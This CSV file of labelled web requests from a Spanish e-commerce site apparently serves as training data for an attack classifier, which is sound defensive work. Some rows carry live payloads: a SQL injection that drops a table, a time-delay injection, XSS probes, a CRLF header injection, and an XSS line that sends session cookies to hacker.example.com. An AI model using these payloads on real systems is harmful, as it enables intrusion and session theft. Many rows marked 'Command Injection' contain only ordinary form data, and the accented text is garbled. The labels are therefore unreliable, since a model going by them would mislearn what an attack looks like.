payload,category
2 | Jam�n Ib�rico | 85 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | A�adir al carrito HTTP/1.1,SQLi
2/ | Jam�n Ib�rico | 85 | 49 | A�adir al carrito HTTP/1.1,Command Injection
entrar | bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | 84m3ri156 | on | Entrar HTTP/1.1,XSS
"entrar | grimshaw | G//lAc,IAr | on | Entrar HTTP/1.1",Command Injection
entrar | grimshaw | 84m3ri156 | on | Entrar HTTP/1.1,Command Injection
2 HTTP/1.1,Other
+ HTTP/1.1,Other
Credenciales incorrectas HTTP/1.1,Other
"insertar | 183','0','0');waitfor delay '0:0:15';-- | Pasar por caja HTTP/1.1",SQLi
insertar | 183 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 183 | Pasar por caja HTTP/1.1,Command Injection
"registro%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | armand | prusiato | Samia | Catalayud Mirabet | balademas.mareuil6@enlanzarote.com.vc | 28178710F | C/ Cala, 9,  | Mutxamel | 25332 | Zaragoza | 8608089924764976 | Registrar HTTP/1.1",Command Injection
"registro | armand | prusiato | any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | Catalayud Mirabet | balademas.mareuil6@enlanzarote.com.vc | 28178710F | C/ Cala, 9,  | Mutxamel | 25332 | Zaragoza | 8608089924764976 | Registrar HTTP/1.1",Command Injection
"registro | bau*gnon | prusiato | Samia | Catalayud Mirabet | balademas.mareuil6@enlanzarote.com.vc | 28178710F | C/ Cala, 9,  | Mutxamel | 25332 | Zaragoza | 8608089924764976 | Registrar HTTP/1.1",Command Injection
"registro | armand | prusiato | Samia | Catalayud Mirabet | balademas.mareuil6@enlanzarote.com.vc | 28178710F | C/ Cala, 9,  | Mutxamel | 25332 | Zaragoza | 8608089924764976 | Registrar HTTP/1.1",Command Injection
Vaciar carrito| HTTP/1.1,Command Injection
Vaciar carrito HTTP/1.1,Other
"registro | thyagara | fUeRTe | Sol | Gorgone Oteo | tissier@b-sign.cg | 03028605B | Calle Alboran 39,  | Millanes | 49731 | Tarragona | 4096797311989091sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | Registrar HTTP/1.1",XSS
"registro | thyagara | fUeRTe | Sol | Gorgone Oteo | tissier@b-sign.cg | %00 | Calle Alboran 39,  | Millanes | 49731 | Tarragona | 4096797311989091 | Registrar HTTP/1.1",Command Injection
"registro | thyagara | fUeRTe | Il,i?dio | Gorgone Oteo | tissier@b-sign.cg | 03028605B | Calle Alboran 39,  | Millanes | 49731 | Tarragona | 4096797311989091 | Registrar HTTP/1.1",Command Injection
"registro | thyagara | fUeRTe | Sol | Gorgone Oteo | tissier@b-sign.cg | 03028605B | Calle Alboran 39,  | Millanes | 49731 | Tarragona | 4096797311989091 | Registrar HTTP/1.1",Command Injection
1 | Jam�n Ib�rico | 85 | bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | A�adir al carrito HTTP/1.1,XSS
3/ | Jam�n Ib�rico | 85 | 1 | A�adir al carrito HTTP/1.1,Command Injection
1 | Jam�n Ib�rico | 85 | 1 | A�adir al carrito HTTP/1.1,Command Injection
